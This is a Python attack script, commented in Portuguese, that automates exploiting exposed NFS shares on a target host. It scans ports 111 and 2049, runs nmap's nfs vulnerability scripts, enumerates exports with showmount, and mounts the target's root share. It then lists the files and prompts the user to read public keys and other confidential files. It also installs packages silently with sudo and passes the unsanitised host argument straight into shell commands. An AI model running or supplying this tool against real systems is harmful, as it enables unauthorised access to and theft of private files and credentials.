#!/usr/bin/env python3

import os
#instala o python-nmap
os.system('pip install python-nmap' + ' > /dev/null')
#instala o tree
os.system('sudo apt-get install tree' + ' > /dev/null')

import sys
import nmap
import time


def scan(host):
            
    #criando um scanner
    scanner = nmap.PortScanner()

    #verificando as portas
    scanner.scan(host, '111,2049')
    
    #imprimindo o status da porta 111
    time.sleep(3)
    port_111_status = scanner[host]['tcp'][111]['state']
    print('Port 111 Status:', port_111_status)
    
    #checka o status da porta 111
    if port_111_status == 'filtered' or port_111_status == 'closed':
        pass

    #imprimindo o status da porta 2049
    time.sleep(3)
    port_2049_status = scanner[host]['tcp'][2049]['state']
    print('Port 2049 Status:', port_2049_status)

    #if port 2049 status is filtered or closed, stop the script
    if port_2049_status == 'filtered' or port_2049_status == 'closed':
        print('As portas 111 e 2049 não estão aberta. O host não está vulnerável ao ataque NFS.')
        quit()


    #procura pela vulnerabilidade
    time.sleep(3)
    print('Executando o nmap e buscando por vulnerabilidades...')
    time.sleep(1)
    os.system('sudo nmap --script nfs* ' + host + ' -sV -p111,2049')
    
    #mostra nfs shares disponíveis
    time.sleep(1)
    print('\n\nMostrando NFS SHARES disponíveis...')
    time.sleep(4)
    os.system('showmount -e ' + host)
    
    #monta nfs share
    time.sleep(1)
    print('\n\nMontando NFS SHARE...')
    time.sleep(4)
    os.system('mkdir target-NFS')
    os.system('mount -t nfs ' + host + ':/ ./target-NFS/ -o nolock')
    time.sleep(4)
    print('Mais alguns segundos...')
    time.sleep(4)        
    os.system('cd target-NFS')
    #lista os arquivos expostos nos NFS SHARE do host
    print('\nListando os arquivos expostos no NFS SHARE do host...')
    time.sleep(2)
    os.system('tree .')
    time.sleep(4)
    
    print('NFS SHARE do host ' + host + ' exploitado com SUCESSO!')
    time.sleep(2)
    print('\nUtilize o comando "cd target-NFS", "ls -l" para listar arquivos usuários e grupos e "ls -n" para listar conteúdos com UIDs e GUIDs.')
    time.sleep(2)
    print('\n*Você pode usar comandos como "cat" para pegar chaves públicas ou outros arquivos confidênciais.')
    time.sleep(2)
    print('\n*Para desmontar, utilize os comandos "cd .." e "umount ./target-NFS"')
            
    
    
#print("O host " + host + " não está vulnerável ao ataque NFS.")    
#time.sleep(2) # espera por 2 segundos

######## args
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Parâmetros incorretos. Por favor utilize \"--target <host>\"')
        exit(1)

    if sys.argv[1] == '--target':
        host = sys.argv[2]
        result = scan(host)        
    else:
        print('Parâmetros incorretos. Por favor utilize \"--target <host>\"')
        exit(1)
